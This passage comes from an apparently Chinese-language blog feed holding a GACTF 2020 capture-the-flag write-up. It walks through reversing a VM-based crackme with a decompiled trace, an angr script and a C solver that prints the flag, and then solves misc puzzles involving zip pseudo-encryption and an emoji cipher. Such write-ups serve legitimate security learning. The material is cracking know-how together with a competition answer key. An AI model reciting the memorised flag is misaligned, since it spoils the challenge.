class="line">a1[<span class="number">9</span>] = a1[<span class="number">1</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">17</span></span><br><span class="line">a1[<span class="number">1</span>] &lt;&lt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">-2049703936</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line">a1[<span class="number">9</span>] = a1[<span class="number">1</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">19</span></span><br><span class="line">a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] == <span class="number">653840640</span> ) <span class="built_in">exit</span>(<span class="number">0</span>) <span class="comment">//首先根据输入的整型数据经过运算后与指定值进行比较，不正确则退出。</span></span><br><span class="line">    </span><br><span class="line">a1[<span class="number">1</span>] = input <span class="comment">//下面依次使用输入的整型数据经过运算后存放入dword_804B2A0数组。</span></span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">255</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">3</span>] = <span class="number">2</span></span><br><span class="line">a1[<span class="number">1</span>] *= a1[<span class="number">3</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">24</span></span><br><span class="line">a1[<span class="number">1</span>] += a1[<span class="number">2</span>]</span><br><span class="line">dword_804B2A0[<span class="number">0</span>] = a1[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">a1[<span class="number">1</span>] = input</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">8</span></span><br><span class="line">a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">255</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">5</span>] = <span class="number">7</span></span><br><span class="line">a1[<span class="number">1</span>] /= a1[<span class="number">5</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">33</span></span><br><span class="line">a1[<span class="number">1</span>] += a1[<span class="number">2</span>]</span><br><span class="line">dword_804B2A0[<span class="number">1</span>] = a1[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">a1[<span class="number">1</span>] = input</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">16</span></span><br><span class="line">a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">255</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">9</span>] = <span class="number">187</span></span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">255</span></span><br><span class="line">a1[<span class="number">1</span>] += a1[<span class="number">2</span>]</span><br><span class="line">dword_804B2A0[<span class="number">2</span>] = a1[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">a1[<span class="number">1</span>] = <span class="number">10000</span></span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">24</span></span><br><span class="line">a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">255</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">4</span>] = <span class="number">160</span></span><br><span class="line">a1[<span class="number">1</span>] -= a1[<span class="number">4</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">119</span></span><br><span class="line">a1[<span class="number">1</span>] += a1[<span class="number">2</span>]</span><br><span class="line">dword_804B2A0[<span class="number">3</span>] = a1[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"flag:"</span>) <span class="comment">//输入flag</span></span><br><span class="line">    </span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">0</span>] <span class="comment">//下面依次对输入的flag的每一位与dword_804B2A0中的数据异或，</span></span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>] </span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">267</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)  <span class="comment">//并与指定数据比较，不相等则退出。</span></span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">1</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">122</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2AC</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">149</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">3</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">262</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">4</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">125</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">5</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2AC</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">173</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">6</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">303</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">7</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">357</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">8</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">301</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">9</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">303</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">10</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">313</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">11</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">269</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">12</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2AC</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">187</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">13</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">8</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">14</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">269</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">15</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">319</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">16</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">314</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">17</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">353</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">18</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">87</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">19</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">288</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">20</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">269</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">21</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">319</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">22</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">319</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">23</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2AC</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">181</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">24</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">275</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">25</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2AC</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">160</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">26</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">289</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">27</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">269</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">28</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">11</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">29</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">313</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">30</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">371</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">31</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">70</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>从上面打印出的执行，整个程序就很清楚了。</p><p>首先就是逆出输入的第一个整型数据，但看了下算法，确实麻烦。。正好之前学习了下angr符号执行，用这个题尝试一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, claripy, sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_success</span><span class="params">(state)</span>:</span></span><br><span class="line">    std_out = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'flag:'</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_false</span><span class="params">(state)</span>:</span></span><br><span class="line">    std_out = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'错误信息'</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">'EasyRe'</span>) <span class="comment">#代表程序的“初始化映像”</span></span><br><span class="line">init_state = proj.factory.entry_state() <span class="comment">#表示模拟从程序的入口点开始的状态</span></span><br><span class="line">good_addr = <span class="number">0x08048BE0</span> </span><br><span class="line">bad_addr = <span class="number">0x08048BF1</span></span><br><span class="line">sim = proj.factory.simgr(init_state) <span class="comment">#申明state的模拟管理器sim来用于执行模拟的程序</span></span><br><span class="line">sim.explore(find = is_success) <span class="comment">#模拟程序的执行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>): <span class="comment">#打印出标准输入，输出，错误输出。</span></span><br><span class="line">print(sim.found[<span class="number">0</span>].posix.dumps(i))</span><br></pre></td></tr></table></figure><p><img src="/2020/08/30/GACTF2020/image-20200913202220431.png" alt="image-20200913202220431"></p><p>很快得到了答案，尝试输入一下，正确。<img src="/2020/08/30/GACTF2020/image-20200913200733625.png" alt="image-20200913200733625"></p><p>开始使用这个整型数据计算出dword_804B2A0数组中的4个值。</p><p>刚刚计算完准备依次逆出flag中的每一位时就想到，其实可以不用计算第一个输入的整型数据，因为给了flag的格式为GACTF。。。根据这个就可以计算出dword_804B2A0数组中的每一位。。</p><p>开始利用之前复制到C语言编译器中的代码打印出flag中每一位与dword_804B2A0[]数组异或的是哪一位，与最后需要用来比较的数据。</p><p>最后算一下，得到flag：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a[] = &#123;<span class="number">267</span>, <span class="number">122</span>, <span class="number">149</span>, <span class="number">262</span>, <span class="number">125</span>, <span class="number">173</span>, <span class="number">303</span>, <span class="number">357</span>,</span><br><span class="line"><span class="number">301</span>, <span class="number">303</span>, <span class="number">313</span>, <span class="number">269</span>, <span class="number">187</span>, <span class="number">8</span>, <span class="number">269</span>, <span class="number">319</span>, </span><br><span class="line"><span class="number">314</span>, <span class="number">353</span>, <span class="number">87</span>, <span class="number">288</span>, <span class="number">269</span>, <span class="number">319</span>, <span class="number">319</span>, <span class="number">181</span>,</span><br><span class="line"><span class="number">275</span>, <span class="number">160</span>, <span class="number">289</span>, <span class="number">269</span>, <span class="number">11</span>, <span class="number">313</span>, <span class="number">371</span>, <span class="number">70</span>&#125;;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">char</span> b[] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>,</span><br><span class="line"><span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">33</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> s[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;, i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">s[<span class="number">0</span>] = <span class="string">'G'</span> ^ a[<span class="number">0</span>];</span><br><span class="line">s[<span class="number">1</span>] = <span class="string">'A'</span> ^ a[<span class="number">1</span>];</span><br><span class="line">s[<span class="number">2</span>] = <span class="string">'T'</span> ^ a[<span class="number">3</span>];</span><br><span class="line">s[<span class="number">3</span>] = <span class="string">'C'</span> ^ a[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">flag[i] = a[i] ^ s[b[i]];</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//GACTF&#123;c7ack_m3_sh3ll_smc_vm_0k?&#125;</span></span><br></pre></td></tr></table></figure><p>其实也是很简单的一个题，利用flag的格式。。</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="SignIN"><a href="#SignIN" class="headerlink" title="SignIN"></a>SignIN</h3><p>将二维码拼接一下，扫出flag。</p><p><img src="/2020/08/30/GACTF2020/image-20200913201331681.png" alt="image-20200913201331681"></p><p><strong>welc0me_t0_GACTF_have_Fun</strong></p><h3 id="crymisc"><a href="#crymisc" class="headerlink" title="crymisc"></a>crymisc</h3><p>一个word文档，但是打不开。拖进010editor查看，发现<strong>504B(PK)</strong>，是一个压缩包。</p><p>改文件后缀后其中一个文件解压失败。</p><p><img src="/2020/08/30/GACTF2020/image-20200913202250211.png" alt="image-20200913202250211"></p><p>谷歌看见可以使用winrar来修复一下。</p><p>下载后，在winrar中打开却是提示有密码。。那就猜测是伪加密了。。下面修改为偶数即可。<img src="/2020/08/30/GACTF2020/image-20200913203212543.png" alt="image-20200913203212543"></p><p>360压缩还是奇妙，伪加密文件直接提示文件出错。。</p><p>然后打开一张图片和一个文本文件。文本文件没有什么，查看图片二进制信息。在最后发现：<img src="/2020/08/30/GACTF2020/image-20200913203442903.png" alt="image-20200913203442903"></p><p>又是一个压缩包，但在开头出现一个字符串，从组成猜测是base64加密。解密得到：<img src="/2020/08/30/GACTF2020/image-20200913203556733.png" alt="image-20200913203556733"></p><p>看来是后面压缩包的密码。然后把该压缩包的头补全（<strong>504b</strong>），输入密码解压：<img src="/2020/08/30/GACTF2020/image-20200913203858388.png" alt="image-20200913203858388"></p><p>到这一步就一直卡住了。。。实在没见过这个表情密码，谷歌百度查到的信息又不会用，，，</p><p>比赛完了才从一位师傅哪里知道要自己从github找到这个项目自己搭建一下环境，然后根据一张表映射关系解密。。。</p><p>根据师傅的指导搭建完后，从题目也很容易想到解密的key是哭脸表情。</p><p>最后解密：<img src="/2020/08/30/GACTF2020/image-20200913204636657.png" alt="image-20200913204636657"></p><p>还有一个坑就是，下面的表情其实是同一个，我还纠结半天。。<img src="/2020/08/30/GACTF2020/image-20200913204805711.png" alt="image-20200913204805711"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;做了2个逆向及杂项还是有收获。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>CrackMe</title>
    <link href="https://www.bxnop.cn/2020/07/31/CrackMe/"/>
    <id>https://www.bxnop.cn/2020/07/31/CrackMe/</id>
    <published>2020-07-31T06:53:57.000Z</published>
    <updated>2020-08-13T06:57:57.844Z</updated>
    
